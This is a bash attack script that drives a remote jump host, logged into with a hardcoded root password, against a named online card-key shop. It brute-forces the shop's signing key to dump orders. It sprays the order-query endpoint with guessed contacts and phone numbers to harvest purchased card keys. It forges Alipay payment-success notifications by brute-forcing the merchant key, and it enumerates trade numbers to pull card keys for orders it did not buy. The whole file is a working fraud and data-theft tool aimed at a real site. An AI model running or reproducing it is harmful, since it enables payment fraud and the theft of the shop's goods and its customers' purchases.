#!/bin/bash
# HK orchestrator for order/kami deep6 (fast path)
set -u
export PATH="/data/venvs/pentest/bin:/data/automation/bin:/data/tools:/usr/local/bin:/usr/bin:$PATH"
OUT="/data/automation/results/xuxin66.top/deep6_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT" /data/tmp /data/logs
LOG=/data/logs/xuxin66-deep6b.log
exec > >(tee -a "$LOG") 2>&1
echo "[$(date +%H:%M:%S)] OUT=$OUT"

JP=124.248.67.170
JP_PASS=UzHlZQDUy7XP
BASE=https://xuxin66.top/shop
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'

qg() {
  /data/automation/bin/qg-proxy-fetch.sh >/dev/null
  sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no "root@$JP" \
    "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env" < /data/config/proxy.env
}

jp() {
  sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=12 "root@$JP" "$@"
}

scpjp() {
  sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no "$1" "root@$JP:$2"
}

qg
python3 /data/automation/bin/xuxin66_build_keys.py | tee "$OUT/keycount.txt"
scpjp /data/tmp/xuxin66_syskeys_prio.txt /data/tmp/xuxin66_syskeys_prio.txt
scpjp /data/automation/bin/xuxin66_syskey_fast.sh /data/tmp/xuxin66_syskey_fast.sh
jp "chmod +x /data/tmp/xuxin66_syskey_fast.sh"

# --- SYS_KEY oracle parallel ---
echo "[$(date +%H:%M:%S)] [1] SYS_KEY oracle"
SYSKEY=""
for oid in 11240 11239 11238 11200 11000 10000 5000 1000 100 1; do
  qg
  echo "[$(date +%H:%M:%S)] oracle oid=$oid"
  out=$(jp "bash /data/tmp/xuxin66_syskey_fast.sh $oid /data/tmp/xuxin66_syskeys_prio.txt 12" 2>/dev/null || true)
  echo "$out" | tee "$OUT/oracle_$oid.txt" | tail -5
  if echo "$out" | grep -q '^HIT|'; then
    SYSKEY=$(echo "$out" | grep '^HIT|' | head -1 | cut -d'|' -f3)
    echo "$SYSKEY" > "$OUT/SYS_KEY.txt"
    echo "SYS_KEY=$SYSKEY"
    break
  fi
done

# --- If SYS_KEY, dump ---
if [ -n "$SYSKEY" ]; then
  echo "[$(date +%H:%M:%S)] [1b] dump orders with SYS_KEY"
  jp bash -s <<EOF | tee "$OUT/order_dump.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6f_ck.txt; KEY='$SYSKEY'
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 12 -A "\$UA" "\$BASE/" -o /dev/null
CSRF=\$(python3 -c "import re;h=open('/tmp/d6f_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
for oid in \$(seq 11240 -1 11160); do
  sk=\$(printf '%s' "\${oid}\${KEY}\${oid}" | md5sum | awk '{print \$1}')
  r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 5 -A "\$UA" -e "\$BASE/" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "id=\$oid" --data-urlencode "skey=\$sk" --data-urlencode "csrf_token=\$CSRF" \
    "\$BASE/ajax.php?act=order" 2>/dev/null)
  echo "ORD|\$oid|\$r"
  echo "\$r" | grep -q kminfo && echo "\$r" >> /tmp/kami_hits.jsonl
done
echo DUMP_DONE
EOF
fi

# --- Query spray ---
echo "[$(date +%H:%M:%S)] [2] query spray"
qg
# contacts file
python3 - <<'PY'
contacts=["123456","888888","666666","111111","000000","123123","5201314","datou111","datou333",
"xuxin66","xuxin","admin","test","qq","13800138000","18888888888","19999999999","10000","10086",
"@xuxin66vip","xuxin079","password","abc123","qwer1234","woaini","666888","123456789","12345678"]
try:
  for i,l in enumerate(open("/tmp/query_pwd_list.txt",errors="ignore")):
    if i>250: break
    v=l.strip()
    if 4<=len(v)<=32: contacts.append(v)
except: pass
# phone patterns
for p in ["130","131","132","133","135","136","137","138","139","150","151","152","155","156","157","158","159","180","181","182","183","185","186","187","188","189"]:
  contacts.append(p+"00000000")
  contacts.append(p+"11111111")
  contacts.append(p+"88888888")
seen=set(); out=[]
for c in contacts:
  if c not in seen:
    seen.add(c); out.append(c)
open("/data/tmp/xuxin66_contacts.txt","w").write("\n".join(out))
print(len(out))
PY
scpjp /data/tmp/xuxin66_contacts.txt /data/tmp/xuxin66_contacts.txt
jp bash -s <<EOF | tee "$OUT/query_spray.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6q_ck.txt
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 20 -A "\$UA" "\$BASE/" -o /tmp/d6q_home.html
CSRF=\$(python3 -c "import re;h=open('/tmp/d6q_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
n=0
while IFS= read -r c; do
  [ -z "\$c" ] && continue
  enc=\$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "\$c")
  curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" "\$BASE/?mod=query&data=\$enc" -o /tmp/d6q.html
  if grep -q showOrder /tmp/d6q.html; then
    echo "HTMLHIT|\$c"
    grep -oE "showOrder\\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\\)" /tmp/d6q.html | head -20
  fi
  r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 6 -A "\$UA" -e "\$BASE/?mod=query" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "qq=\$c" --data-urlencode "type=0" --data-urlencode "page=1" --data-urlencode "csrf_token=\$CSRF" \
    "\$BASE/ajax.php?act=query" 2>/dev/null)
  if echo "\$r" | grep -q '"skey"' ; then echo "AJAXHIT|\$c|\$r"; fi
  n=\$((n+1))
  [ \$((n % 50)) -eq 0 ] && echo PROGRESS|\$n
done < /data/tmp/xuxin66_contacts.txt
echo QUERY_DONE|\$n
EOF

# pull kami for any showOrder hits
if grep -q showOrder "$OUT/query_spray.txt" 2>/dev/null; then
  echo "[$(date +%H:%M:%S)] [2b] fetch kami from showOrder"
  grep -oE "showOrder\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\)" "$OUT/query_spray.txt" | sort -u | while read -r so; do
    oid=$(echo "$so" | grep -oE '[0-9]+' | head -1)
    sk=$(echo "$so" | grep -oE "[0-9a-fA-F]{32}")
    echo "FETCH $oid $sk"
    jp bash -s <<EOF | tee -a "$OUT/kami_fetch.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6q_ck.txt
r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" -e "\$BASE/?mod=query" \
  -H "X-Requested-With: XMLHttpRequest" -X POST \
  --data-urlencode "id=$oid" --data-urlencode "skey=$sk" \
  "\$BASE/ajax.php?act=order")
echo "KAMI|$oid|$sk|\$r"
EOF
  done
fi

# --- Create order + notify ---
echo "[$(date +%H:%M:%S)] [3] pay+notify"
qg
jp bash -s <<EOF | tee "$OUT/pay_notify.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6p_ck.txt
rm -f \$CK
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 25 -A "\$UA" "\$BASE/" -o /tmp/d6p_home.html
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 20 -A "\$UA" "\$BASE/?mod=buy&cid=15&tid=168" -o /tmp/d6p_buy.html
python3 - <<'PY'
import re,subprocess
h=open('/tmp/d6p_buy.html',encoding='utf-8',errors='ignore').read()
csrf=re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"',h)
hs=re.search(r'var hashsalt=(.+?);',h)
open('/tmp/d6p_csrf.txt','w').write(csrf.group(1) if csrf else '')
open('/tmp/d6p_hs_expr.txt','w').write(hs.group(1) if hs else '')
print('csrf', open('/tmp/d6p_csrf.txt').read()[:20])
print('expr_len', len(open('/tmp/d6p_hs_expr.txt').read()))
PY
EOF
# decode hashsalt on HK
expr=$(jp "cat /tmp/d6p_hs_expr.txt" 2>/dev/null)
hs=$(node -e "console.log($expr)" 2>/dev/null || true)
csrf=$(jp "cat /tmp/d6p_csrf.txt" 2>/dev/null | tr -d '\r\n')
inputv="kami$(date +%H%M%S)"
echo "hashsalt=$hs csrf=${csrf:0:16} input=$inputv"
pay=$(jp bash -s <<EOF
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6p_ck.txt
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 15 -A "\$UA" -e "\$BASE/?mod=buy&cid=15&tid=168" \
 -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "tid=168" --data-urlencode "inputvalue=$inputv" --data-urlencode "num=1" \
 --data-urlencode "hashsalt=$hs" --data-urlencode "csrf_token=$csrf" \
 "\$BASE/ajax.php?act=pay"
echo
EOF
)
echo "$pay" | tee "$OUT/pay.json"
TRADE=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('trade_no',''))" "$pay" 2>/dev/null || true)
echo "TRADE=$TRADE"

if [ -n "$TRADE" ]; then
  # submit
  sub=$(jp bash -s <<EOF
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6p_ck.txt
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 15 -A "\$UA" "\$BASE/other/submit.php?type=alipay&orderid=$TRADE" -o /tmp/d6p_sub.html
grep -oE 'https?://[^\"'\\'' <>]+' /tmp/d6p_sub.html | head -3
EOF
)
  echo "$sub" | tee "$OUT/submit.txt"
  MONEY=$(echo "$sub" | grep -oE 'money=[0-9.]+' | head -1 | cut -d= -f2)
  PID=$(echo "$sub" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2)
  MONEY=${MONEY:-9}
  PID=${PID:-1003}
  echo "MONEY=$MONEY PID=$PID"
  # notify keys = first 2000 prio
  head -2000 /data/tmp/xuxin66_syskeys_prio.txt > /data/tmp/xuxin66_notify_keys.txt
  scpjp /data/tmp/xuxin66_notify_keys.txt /data/tmp/xuxin66_notify_keys.txt
  jp bash -s <<EOF | tee "$OUT/notify_try.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6p_ck.txt
TRADE='$TRADE'; MONEY='$MONEY'; PID='$PID'
n=0
while IFS= read -r key; do
  [ -z "\$key" ] && continue
  sign=\$(MONEY="\$MONEY" TRADE="\$TRADE" PID="\$PID" KEY="\$key" python3 -c 'import hashlib,os;p={"pid":os.environ["PID"],"type":"alipay","out_trade_no":os.environ["TRADE"],"notify_url":"https://xuxin66.top/shop/other/epay_notify.php","return_url":"https://xuxin66.top/shop/other/epay_return.php","name":"test","money":os.environ["MONEY"],"trade_no":os.environ["TRADE"],"trade_status":"TRADE_SUCCESS"};items=sorted(k for k in p if p[k]!="");s="&".join(f"{k}={p[k]}" for k in items)+os.environ["KEY"];print(hashlib.md5(s.encode()).hexdigest())')
  r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 5 -A "\$UA" -X POST \
    --data-urlencode "pid=\$PID" --data-urlencode "type=alipay" \
    --data-urlencode "out_trade_no=\$TRADE" --data-urlencode "trade_no=\$TRADE" \
    --data-urlencode "notify_url=https://xuxin66.top/shop/other/epay_notify.php" \
    --data-urlencode "return_url=https://xuxin66.top/shop/other/epay_return.php" \
    --data-urlencode "name=test" --data-urlencode "money=\$MONEY" \
    --data-urlencode "trade_status=TRADE_SUCCESS" --data-urlencode "sign=\$sign" \
    --data-urlencode "sign_type=MD5" \
    "\$BASE/other/epay_notify.php" 2>/dev/null)
  n=\$((n+1))
  if [ -n "\$r" ] && [ "\$r" != "error" ] && [ "\$r" != "fail" ] && [ "\$r" != "FAIL" ]; then
    echo "NOTIFYHIT|\$key|\$r"
  fi
  [ \$((n % 200)) -eq 0 ] && echo NPROG|\$n
done < /data/tmp/xuxin66_notify_keys.txt
gs=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" "\$BASE/other/getshop.php?trade_no=\$TRADE")
echo "GS|\$gs"
enc=\$(python3 -c "import urllib.parse;print(urllib.parse.quote('$inputv'))")
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 10 -A "\$UA" "\$BASE/?mod=query&data=\$enc" -o /tmp/d6q2.html
grep -q showOrder /tmp/d6q2.html && echo "PAIDQUERYHIT|$inputv" && grep -oE "showOrder\\([^)]+\\)" /tmp/d6q2.html | head
echo NOTIFY_DONE|\$n
EOF
fi

# --- denser getshop around known + last hours ---
echo "[$(date +%H:%M:%S)] [4] getshop dense"
python3 - <<'PY'
from datetime import datetime, timedelta
cands=[]
# denser last 6 hours of today (server UTC? use local)
now=datetime.now()
for off in range(0, 6*3600, 2):
  t=now-timedelta(seconds=off)
  for suf in range(100,1000,11):
    cands.append(t.strftime("%Y%m%d%H%M%S")+f"{suf:03d}")
# around known cluster
base=datetime(2026,8,3,6,44,0)
for off in range(-300,301):
  t=base+timedelta(seconds=off)
  for suf in range(100,1000,17):
    cands.append(t.strftime("%Y%m%d%H%M%S")+f"{suf:03d}")
# unique keep order
seen=set(); out=[]
for c in cands:
  if c not in seen:
    seen.add(c); out.append(c)
open("/data/tmp/xuxin66_tn6.txt","w").write("\n".join(out[:8000]))
print(len(out[:8000]))
PY
scpjp /data/tmp/xuxin66_tn6.txt /data/tmp/xuxin66_tn6.txt
qg
jp bash -s <<EOF | tee "$OUT/getshop_scan.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6g_ck.txt
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 15 -A "\$UA" "\$BASE/" -o /dev/null
export PROXY_URL CK BASE UA
try() {
  tn="\$1"
  r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 3 -A "\$UA" "\$BASE/other/getshop.php?trade_no=\$tn" 2>/dev/null)
  if [ -n "\$r" ] && ! echo "\$r" | grep -q '未付款' ; then
    if echo "\$r" | grep -Eq '"code":0|卡密|kminfo|km'; then
      echo "GSHIT|\$tn|\$r"
    elif ! echo "\$r" | grep -q '订单不存在' && ! echo "\$r" | grep -q '"code":-1'; then
      echo "GSOTHER|\$tn|\$r"
    fi
  fi
}
export -f try
# parallel 8
cat /data/tmp/xuxin66_tn6.txt | xargs -P 8 -I{} bash -c 'try "$@"' _ {}
echo GSDONE
EOF

# summary
python3 - <<PY
import os,re,json
out="$OUT"
f={
 "syskey": open(f"{out}/SYS_KEY.txt").read().strip() if os.path.isfile(f"{out}/SYS_KEY.txt") else None,
 "oracle_hits": [],
 "query_hits": [],
 "kami": [],
 "notify_hits": [],
 "getshop": [],
}
for fn in os.listdir(out):
  p=os.path.join(out,fn)
  try: t=open(p,encoding="utf-8",errors="ignore").read()
  except: continue
  if fn.startswith("oracle_") and "HIT|" in t:
    f["oracle_hits"].append([ln for ln in t.splitlines() if ln.startswith("HIT|")][:3])
  if "HTMLHIT|" in t or "AJAXHIT|" in t:
    f["query_hits"] += [ln for ln in t.splitlines() if "HIT|" in ln][:50]
  if "KAMI|" in t or "kminfo" in t:
    f["kami"] += [ln for ln in t.splitlines() if "KAMI|" in ln or "kminfo" in ln][:30]
  if "NOTIFYHIT|" in t:
    f["notify_hits"] += [ln for ln in t.splitlines() if ln.startswith("NOTIFYHIT|")]
  if "GSHIT|" in t or "GSOTHER|" in t:
    f["getshop"] += [ln for ln in t.splitlines() if ln.startswith("GS")][:50]
json.dump(f, open(f"{out}/FINDINGS.json","w"), ensure_ascii=False, indent=2)
md=f"""# xuxin66 订单/卡密 deep6

- OUT: {out}
- SYS_KEY: `{f['syskey']}`
- oracle hits: {len(f['oracle_hits'])}
- query hits: {len(f['query_hits'])}
- kami lines: {len(f['kami'])}
- notify hits: {len(f['notify_hits'])}
- getshop interesting: {len(f['getshop'])}
"""
open(f"{out}/SUMMARY.md","w").write(md)
print(md)
PY
echo "===== DONE ===== OUT=$OUT"
